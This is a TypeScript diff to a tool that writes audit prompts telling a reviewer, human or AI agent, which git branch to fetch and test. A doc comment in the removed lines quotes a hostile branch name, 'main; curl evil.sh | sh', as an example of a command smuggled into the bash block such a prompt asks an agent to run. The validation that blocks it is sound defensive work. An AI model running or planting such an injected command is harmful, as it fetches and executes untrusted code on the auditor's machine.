@@ -206,21 +206,60 @@ function scopedCommitShas(cwd: string, issueId: string): string[] {
   }
 }
 
-/** Resolve a declared branch to a rev, preferring local over origin. */
-function resolveRev(cwd: string, branch: string): string | null {
-  for (const ref of [branch, `origin/${branch}`]) {
-    try {
-      execFileSync("git", ["rev-parse", "--verify", `${ref}^{commit}`], { cwd, stdio: "pipe" });
-      return ref;
-    } catch {
-      /* try the next candidate */
-    }
-  }
-  return null;
+/**
+ * A ref an auditor can actually be sent to.
+ *
+ * `name` is the short branch name — what you pass to `git fetch origin`.
+ * `onOrigin` says whether `origin/<name>` exists, which decides both the
+ * fetch line and whether a fresh clone can reach it at all.
+ */
+interface AuditRef {
+  name: string;
+  onOrigin: boolean;
 }
 
-/** Branch-shaped refs that contain every one of `shas`, most local first. */
-function refsContainingAll(cwd: string, shas: string[]): string[] {
+/** True when the project is a git repo with an `origin` remote. */
+function hasOrigin(cwd: string): boolean {
+  try {
+    execFileSync("git", ["remote", "get-url", "origin"], { cwd, stdio: "pipe" });
+    return true;
+  } catch {
+    return false;
+  }
+}
+
+function refExists(cwd: string, ref: string): boolean {
+  try {
+    execFileSync("git", ["rev-parse", "--verify", `${ref}^{commit}`], { cwd, stdio: "pipe" });
+    return true;
+  } catch {
+    return false;
+  }
+}
+
+/** Every sha in `shas` reachable from `ref`? */
+function containsAll(cwd: string, ref: string, shas: string[]): string[] {
+  return shas.filter((sha) => {
+    try {
+      execFileSync("git", ["merge-base", "--is-ancestor", sha, ref], { cwd, stdio: "pipe" });
+      return false;
+    } catch {
+      return true;
+    }
+  });
+}
+
+/**
+ * Branch-shaped refs that contain every one of `shas`, deduplicated to
+ * short names, the ones an auditor can fetch first.
+ *
+ * `git branch -a` lists `chore/x` and `origin/chore/x` as two entries for
+ * what is one branch. Handing the second to `git fetch origin` produces
+ * `git fetch origin origin/chore/x` — a request for a branch of that
+ * literal name, which does not exist. Collapse them, and remember whether
+ * origin had it.
+ */
+function refsContainingAll(cwd: string, shas: string[]): AuditRef[] {
   if (shas.length === 0) return [];
   let acc: string[] | null = null;
   for (const sha of shas) {
@@ -239,7 +278,19 @@ function refsContainingAll(cwd: string, shas: string[]): string[] {
     acc = acc === null ? refs : acc.filter((r) => refs.includes(r));
     if (acc.length === 0) return [];
   }
-  return (acc ?? []).filter((r) => isValidBranchName(r));
+
+  const byName = new Map<string, boolean>();
+  for (const ref of (acc ?? []).filter((r) => isValidBranchName(r))) {
+    const remote = ref.startsWith("origin/");
+    const name = remote ? ref.slice("origin/".length) : ref;
+    if (!isValidBranchName(name)) continue;
+    byName.set(name, (byName.get(name) ?? false) || remote);
+  }
+  // A ref origin already has is worth more than a local-only one: the
+  // auditor is a fresh session, and may be a fresh clone.
+  return [...byName.entries()]
+    .map(([name, onOrigin]) => ({ name, onOrigin }))
+    .sort((a, b) => Number(b.onOrigin) - Number(a.onOrigin));
 }
 
 /**
@@ -249,22 +300,29 @@ function refsContainingAll(cwd: string, shas: string[]): string[] {
  * ISS-0133 scoped the *diff* to the issue's own commits, searched across
  * every ref. It left the *tree* pinned to `branch:`. Those are two answers
  * to two different questions, and on this very board they diverged: the
- * four loop-B fiches declare `claude/…wtkc94` while their correction
+ * four loop-B fiches declared `claude/…wtkc94` while their correction
  * commits landed on `chore/ISS-0126-…`. An auditor sent to the declared
  * branch reads a fixed patch and then reproduces the old defect in the
  * tests — a packet that contradicts itself, and a false NO_GO.
  *
- * `unsafe` is the second half: the branch name is interpolated into a bash
- * fence the prompt tells the auditor to run. `issue-ops.ts` already gained
- * `isValidBranchName()` for exactly this class of bug; review had not used
- * it. A fiche declaring `main; curl evil.sh | sh` was a command the prompt
- * instructed a human — or an agent — to execute.
+ * **The cross-check must use the ref an auditor can retrieve.** The first
+ * version of this function preferred the local branch, and the re-review
+ * caught it committing the very defect it was written to stop: local was
+ * two commits ahead of origin, `contained` was returned, and the packet
+ * still sent a fresh clone to a tree without the fixes. `origin/<branch>`
+ * is authoritative here; local agreement is not evidence.
+ *
+ * `unsafe` is a separate concern: the branch name is interpolated into a
+ * bash fence the prompt tells the auditor to run. `issue-ops.ts` already
+ * gained `isValidBranchName()` for exactly this class of bug; review had
+ * not used it.
  */
 export type AuditTarget =
   | { kind: "none" }
   | { kind: "unsafe"; branch: string }
-  | { kind: "contained"; branch: string; commits: number }
-  | { kind: "diverged"; branch: string; missing: string[]; candidates: string[] };
+  | { kind: "contained"; branch: string; onOrigin: boolean; commits: number }
+  | { kind: "unpushed"; branch: string; missing: string[] }
+  | { kind: "diverged"; branch: string; missing: string[]; candidates: AuditRef[] };
 
 export function auditTarget(
   cwd: string,
@@ -275,31 +333,49 @@ export function auditTarget(
   if (!isValidBranchName(declaredBranch)) return { kind: "unsafe", branch: declaredBranch };
 
   const shas = scopedCommitShas(cwd, issueId);
-  const rev = resolveRev(cwd, declaredBranch);
-  // Nothing to cross-check: no scoped commits (the loud fallback owns that
-  // case) or no reachable ref (checkDeclaredBranch already warns).
-  if (shas.length === 0 || rev === null) {
-    return { kind: "contained", branch: declaredBranch, commits: shas.length };
+  const remoteRef = `origin/${declaredBranch}`;
+  const onOrigin = hasOrigin(cwd) && refExists(cwd, remoteRef);
+  const localExists = refExists(cwd, declaredBranch);
+
+  // Nothing to cross-check: no scoped commits (the loud fallback in
+  // section 7 owns that case) or no reachable ref at all.
+  if (shas.length === 0 || (!onOrigin && !localExists)) {
+    return { kind: "contained", branch: declaredBranch, onOrigin, commits: shas.length };
   }
 
-  const missing = shas.filter((sha) => {
-    try {
-      execFileSync("git", ["merge-base", "--is-ancestor", sha, rev], { cwd, stdio: "pipe" });
-      return false;
-    } catch {
-      return true;
-    }
-  });
-
+  // The ref the auditor will actually retrieve.
+  const auditRef = onOrigin ? remoteRef : declaredBranch;
+  const missing = containsAll(cwd, auditRef, shas);
   if (missing.length === 0) {
-    return { kind: "contained", branch: declaredBranch, commits: shas.length };
+    return { kind: "contained", branch: declaredBranch, onOrigin, commits: shas.length };
   }
+
+  // Present locally but not on origin: not a wrong branch, an unpushed one.
+  // Different defect, different remedy — say which.
+  if (onOrigin && localExists && containsAll(cwd, declaredBranch, shas).length === 0) {
+    return { kind: "unpushed", branch: declaredBranch, missing: missing.map((s) => s.slice(0, 7)) };
+  }
+
   return {
     kind: "diverged",
     branch: declaredBranch,
     missing: missing.map((sha) => sha.slice(0, 7)),
-    candidates: refsContainingAll(cwd, shas).filter((r) => r !== declaredBranch),
+    candidates: refsContainingAll(cwd, shas).filter((r) => r.name !== declaredBranch),
   };
+}
+
+/** The `git fetch` + `git worktree add` pair for a retrievable ref. */
+function checkoutBlock(ref: AuditRef, issueId: string): string {
+  return ref.onOrigin
+    ? `\`\`\`bash
+git fetch origin ${ref.name}
+git worktree add /tmp/audit-${issueId} origin/${ref.name}   # or: git checkout ${ref.name}
+\`\`\``
+    : `\`\`\`bash
+git worktree add /tmp/audit-${issueId} ${ref.name}   # or: git checkout ${ref.name}
+\`\`\`
+
+⚠️ This ref exists only locally — \`origin\` does not have it. If you are working from a fresh clone you cannot retrieve it; say so in your Notes rather than auditing a different tree.`;
 }
 
 /** The `**Where to audit:**` paragraph, rendered from an `AuditTarget`. */
@@ -315,25 +391,27 @@ function renderWhereToAudit(target: AuditTarget, issueId: string): string {
     case "contained":
       return `**Where to audit:** the issue declares its work on branch \`${target.branch}\`. Audit THAT branch, not the tree your session was opened on. Place yourself on it first — either check it out, or create a temporary worktree:
 
-\`\`\`bash
-git fetch origin ${target.branch}
-git worktree add /tmp/audit-${issueId} ${target.branch}   # or: git checkout ${target.branch}
-\`\`\`
+${checkoutBlock({ name: target.branch, onOrigin: target.onOrigin }, issueId)}
 
 Run every check (tests, file reads, greps) against that branch.`;
+
+    case "unpushed":
+      return `**Where to audit:** ⚠️ **the corrections exist only on someone's local machine.** The fiche declares \`${target.branch}\`, and a local branch of that name does contain every commit in the diff below — but \`origin/${target.branch}\` does not: ${target.missing.map((s) => `\`${s}\``).join(", ")} were never pushed.
+
+Fetching and auditing \`${target.branch}\` gets you the tree *before* those commits. You would read the corrected patches in section 7 and then reproduce the old behaviour in the tests.
+
+**Do not run the checks.** Report this: the work is unpushed, and the audit cannot proceed until it is. This is a one-command fix for the implementer, not a defect in the code you are reading.`;
 
     case "diverged": {
       const best = target.candidates[0];
       const missingList = target.missing.map((s) => `\`${s}\``).join(", ");
+      const others = target.candidates.slice(1, 4).map((c) => `\`${c.name}\``).join(", ");
       const fallback = best
-        ? `The commits below are all reachable from \`${best}\`. **Audit there**, and note the substitution in your Notes:
+        ? `The commits below are all reachable from \`${best.name}\`. **Audit there**, and note the substitution in your Notes:
 
-\`\`\`bash
-git fetch origin ${best}
-git worktree add /tmp/audit-${issueId} ${best}   # or: git checkout ${best}
-\`\`\`
-${target.candidates.length > 1 ? `
-Other refs that also contain them: ${target.candidates.slice(1, 4).map((c) => `\`${c}\``).join(", ")}.` : ""}`
+${checkoutBlock(best, issueId)}${others ? `
+
+Other refs that also contain them: ${others}.` : ""}`
         : `**No ref in this repository contains all of them.** Do not run the checks anywhere: report this as a defect — the fiche points at work that cannot be tested as exported.`;
 
       return `**Where to audit:** ⚠️ **the declared branch does not contain this issue's commits.** The fiche declares \`${target.branch}\`, but ${target.missing.length} of the commits in the diff below (${missingList}) are not reachable from it.
@@ -346,6 +424,7 @@ Either way, **report the stale \`branch:\` field itself** — the fiche is lying
     }
   }
 }
+
 
 export interface BuildPromptOptions {
   /** Project root that contains .lytos/ */
